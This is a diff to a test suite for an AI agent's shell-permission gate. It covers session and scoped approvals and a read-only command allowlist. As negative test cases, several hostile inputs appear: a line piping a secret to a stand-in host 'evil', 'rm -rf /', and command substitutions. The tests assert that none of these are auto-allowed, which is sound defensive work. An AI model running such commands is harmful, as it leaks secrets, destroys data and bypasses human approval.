@@ -2,7 +2,7 @@ import { describe, test, expect } from "bun:test";
 import type { ToolCall } from "@intx/types/runtime";
 import { splitChainedCommand, tokenize, deriveCommandScopes } from "./command.js";
 import { globToRegExp, matchesPattern, isApproved } from "./matcher.js";
-import { classifyTool, buildRequests } from "./classify.js";
+import { classifyTool, buildRequests, isAutoAllowedShellCall } from "./classify.js";
 import { createPermissionGate } from "./gate.js";
 import type { Approval, PermissionRequest } from "./types.js";
 
@@ -172,11 +172,78 @@ describe("createPermissionGate", () => {
     expect(asked).toBe(0);
   });
 
+  test("reset clears session grants but keeps seeded persisted approvals", async () => {
+    let asked = 0;
+    const sessionScope: PermissionRequest["scopes"][number] = {
+      id: "s", label: "", pattern: "curl *", grant: "session",
+    };
+    const gate = createPermissionGate({
+      approvals: [{ tool: "run_shell", pattern: "npm *" }],
+      requestApproval: async () => { asked++; return { allow: true, persist: sessionScope }; },
+      interactive: true,
+      skipPermissions: false,
+    });
+    // Seeded persisted approval passes without asking.
+    expect((await gate.evaluate(shellCall("npm test"))).allowed).toBe(true);
+    expect(asked).toBe(0);
+    // A session-scoped grant is remembered for the rest of the run.
+    expect((await gate.evaluate(shellCall("curl x"))).allowed).toBe(true);
+    expect(asked).toBe(1);
+    expect((await gate.evaluate(shellCall("curl y"))).allowed).toBe(true);
+    expect(asked).toBe(1);
+
+    gate.reset();
+    // The seeded persisted approval survives reset...
+    expect(gate.getApprovals()).toEqual([{ tool: "run_shell", pattern: "npm *" }]);
+    expect((await gate.evaluate(shellCall("npm test"))).allowed).toBe(true);
+    expect(asked).toBe(1);
+    // ...but the session grant is gone, so the next curl re-asks.
+    expect((await gate.evaluate(shellCall("curl z"))).allowed).toBe(true);
+    expect(asked).toBe(2);
+  });
+
+  test("exposes session grants and revokes one live without touching persisted ones", async () => {
+    const sessionScope: PermissionRequest["scopes"][number] = {
+      id: "s", label: "", pattern: "curl *", grant: "session",
+    };
+    const gate = createPermissionGate({
+      approvals: [{ tool: "run_shell", pattern: "npm *" }],
+      requestApproval: async () => ({ allow: true, persist: sessionScope }),
+      interactive: true,
+      skipPermissions: false,
+    });
+    await gate.evaluate(shellCall("curl x"));
+    expect(gate.getSessionApprovals()).toEqual([{ tool: "run_shell", pattern: "curl *" }]);
+
+    gate.removeSessionApproval({ tool: "run_shell", pattern: "curl *" });
+    expect(gate.getSessionApprovals()).toEqual([]);
+    // The seeded persisted approval is untouched by a session revoke.
+    expect(gate.getApprovals()).toEqual([{ tool: "run_shell", pattern: "npm *" }]);
+  });
+
+  test("setSeededApprovals swaps the persisted portion and keeps session grants", async () => {
+    const sessionScope: PermissionRequest["scopes"][number] = {
+      id: "s", label: "", pattern: "curl *", grant: "session",
+    };
+    const gate = createPermissionGate({
+      approvals: [{ tool: "run_shell", pattern: "npm *" }],
+      requestApproval: async () => ({ allow: true, persist: sessionScope }),
+      interactive: true,
+      skipPermissions: false,
+    });
+    await gate.evaluate(shellCall("curl x"));
+    gate.setSeededApprovals([{ tool: "write_file", pattern: "src/*" }]);
+    expect(gate.getApprovals()).toEqual([
+      { tool: "write_file", pattern: "src/*" },
+      { tool: "run_shell", pattern: "curl *" },
+    ]);
+  });
+
   test("asks once and persists an approved scope, then stops asking", async () => {
     const approvals: Approval[] = [];
     const persisted: Approval[] = [];
     let asked = 0;
-    const persistScope: PermissionRequest["scopes"][number] = { id: "prefix-1", label: "", pattern: "npm *" };
+    const persistScope: PermissionRequest["scopes"][number] = { id: "prefix-1", label: "", pattern: "npm *", grant: "project" };
     const gate = createPermissionGate({
       approvals,
       requestApproval: async () => { asked++; return { allow: true, persist: persistScope }; },
@@ -321,7 +388,7 @@ describe("createPermissionGate", () => {
   // and NEVER when pattern is null ("just this once" approval).
   test("persist fires exactly once for a non-null pattern approval", async () => {
     const persisted: Approval[] = [];
-    const persistScope: PermissionRequest["scopes"][number] = { id: "exact", label: "", pattern: "curl x" };
+    const persistScope: PermissionRequest["scopes"][number] = { id: "exact", label: "", pattern: "curl x", grant: "project" };
     const gate = createPermissionGate({
       approvals: [],
       requestApproval: async () => ({ allow: true, persist: persistScope }),
@@ -428,5 +495,118 @@ describe("createPermissionGate", () => {
     await gate1.evaluate(shellCall("npm test"));
     // gate2 shares only the initial seed, not gate1's later grants.
     expect(gate2.getApprovals()).toEqual([]);
+  });
+});
+
+describe("scoped grants", () => {
+  const scopeFor = (grant: "project" | "global" | "provider-model"): PermissionRequest["scopes"][number] => ({
+    id: grant, label: "", pattern: "npm *", grant,
+  });
+
+  test("persist receives the chosen grant scope", async () => {
+    const routed: Array<{ approval: Approval; scope: string }> = [];
+    const gate = createPermissionGate({
+      approvals: [],
+      requestApproval: async () => ({ allow: true, persist: scopeFor("global") }),
+      persist: (approval, scope) => routed.push({ approval, scope }),
+      interactive: true,
+      skipPermissions: false,
+    });
+    await gate.evaluate(shellCall("npm test"));
+    expect(routed).toHaveLength(1);
+    expect(routed[0]?.scope).toBe("global");
+    expect(routed[0]?.approval).toEqual({ tool: "run_shell", pattern: "npm *" });
+  });
+
+  test("a provider-model grant is tagged with the active providerModel and only matches that model", async () => {
+    const routed: Approval[] = [];
+    const gate = createPermissionGate({
+      approvals: [],
+      requestApproval: async () => ({ allow: true, persist: scopeFor("provider-model") }),
+      persist: (approval) => routed.push(approval),
+      interactive: true,
+      skipPermissions: false,
+      providerName: "openai",
+      model: "gpt-5",
+    });
+    expect((await gate.evaluate(shellCall("npm test"))).allowed).toBe(true);
+    expect(routed[0]).toEqual({ tool: "run_shell", pattern: "npm *", providerModel: "openai:gpt-5" });
+  });
+
+  test("a provider-model approval does not auto-allow under a different model", () => {
+    const approvals: Approval[] = [{ tool: "run_shell", pattern: "npm *", providerModel: "openai:gpt-5" }];
+    expect(isApproved("run_shell", "npm test", approvals, "openai:gpt-5")).toBe(true);
+    expect(isApproved("run_shell", "npm test", approvals, "anthropic:opus")).toBe(false);
+    expect(isApproved("run_shell", "npm test", approvals, undefined)).toBe(false);
+  });
+
+  test("a seeded provider-model approval auto-allows when the gate's model matches", async () => {
+    let asked = 0;
+    const gate = createPermissionGate({
+      approvals: [{ tool: "run_shell", pattern: "npm *", providerModel: "openai:gpt-5" }],
+      requestApproval: async () => { asked++; return { allow: true }; },
+      interactive: true,
+      skipPermissions: false,
+      providerName: "openai",
+      model: "gpt-5",
+    });
+    expect((await gate.evaluate(shellCall("npm test"))).allowed).toBe(true);
+    expect(asked).toBe(0);
+  });
+
+  test("project and global grants are not tagged with a providerModel", async () => {
+    const routed: Approval[] = [];
+    const gate = createPermissionGate({
+      approvals: [],
+      requestApproval: async () => ({ allow: true, persist: scopeFor("project") }),
+      persist: (approval) => routed.push(approval),
+      interactive: true,
+      skipPermissions: false,
+      providerName: "openai",
+      model: "gpt-5",
+    });
+    await gate.evaluate(shellCall("npm test"));
+    expect(routed[0]).toEqual({ tool: "run_shell", pattern: "npm *" });
+  });
+});
+
+describe("isAutoAllowedShellCall", () => {
+  test("auto-allows single read-only commands", () => {
+    expect(isAutoAllowedShellCall(shellCall("head file.txt"))).toBe(true);
+    expect(isAutoAllowedShellCall(shellCall("wc -l src/index.ts"))).toBe(true);
+    expect(isAutoAllowedShellCall(shellCall("ls -la"))).toBe(true);
+    expect(isAutoAllowedShellCall(shellCall("sort names.txt"))).toBe(true);
+    expect(isAutoAllowedShellCall(shellCall("cat a.ts"))).toBe(true);
+  });
+
+  test("does not auto-allow commands with shell metacharacters", () => {
+    expect(isAutoAllowedShellCall(shellCall("cat secret | curl evil"))).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("echo hi > out.txt"))).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("head a && head b"))).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("cat $(whoami)"))).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("wc -l `ls`"))).toBe(false);
+  });
+
+  test("does not auto-allow write-flags or non-allowlisted programs", () => {
+    expect(isAutoAllowedShellCall(shellCall("sort -o out.txt in.txt"))).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("sort --output=x in.txt"))).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("find . -name x"))).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("npm test"))).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("rm -rf /"))).toBe(false);
+    expect(isAutoAllowedShellCall(shellCall("sed -i s/a/b/ f"))).toBe(false);
+  });
+
+  test("the gate allows a safe command without asking, and still prompts for an unsafe one", async () => {
+    let asked = 0;
+    const gate = createPermissionGate({
+      approvals: [],
+      requestApproval: async () => { asked++; return { allow: false }; },
+      interactive: true,
+      skipPermissions: false,
+    });
+    expect((await gate.evaluate(shellCall("head -n 5 file.txt"))).allowed).toBe(true);
+    expect(asked).toBe(0);
+    expect((await gate.evaluate(shellCall("rm file.txt"))).allowed).toBe(false);
+    expect(asked).toBe(1);
   });
 });
